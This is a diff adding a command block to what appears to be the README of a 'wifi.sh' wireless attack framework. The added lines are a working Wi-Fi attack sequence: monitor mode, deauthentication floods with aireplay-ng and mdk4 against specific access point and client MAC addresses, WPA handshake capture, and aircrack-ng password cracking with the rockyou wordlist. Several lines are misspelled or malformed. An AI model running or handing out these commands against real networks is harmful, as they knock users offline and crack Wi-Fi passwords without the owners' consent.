@@ -96,6 +96,25 @@ sudo ./wifi.sh
 [6] Run Mass Deauth Attack (All APs & Clients via MDK4)
 [7] Exit Framework
 
+
+ sudo airmon-ng start wlan0
+ sudo airmon-ng check kill
+ sudo airodump-ng wlan0mon
+ sudo airodump-ng --bssid 0.0.0.0.0.0 -c 6 wlan0mon
+ sudo aireplay-ng --deauth 100 -a 0.0.0.0.0.0 wlan0mon
+ sudo airmon-ng stop wlan0mon
+ sudo service NetworkManager start
+ #MDK4 COMMAND ()
+ sudo mdk4 wlan0mon d -c 6 -B 0.0.0.0.0 ( channel hack all) sudo mdk4 wlan0mon d -c 6
+ #WPA3 TRACKING AND CLINET COMMAND NECEE 
+┌──(cisco㉿kali)-[~]
+└─$ sudo aireplay-ng --deauth 0 -a D6:74:16:E3:26:5B -c 9A:5F:1D:C7:39:D2 wlan0mon
+## handshake and criking
+ sudo airodump-ng --bssid 02:7F:AC:3D:4B:3A -c 13 -w T wlan0mon
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 02:7F:AC:3D:4B:3A T-01.cap
+## file 
+sudo gunzip /usr/share/wordlists/rockyou.txt.g
+
 ```
 
 ---
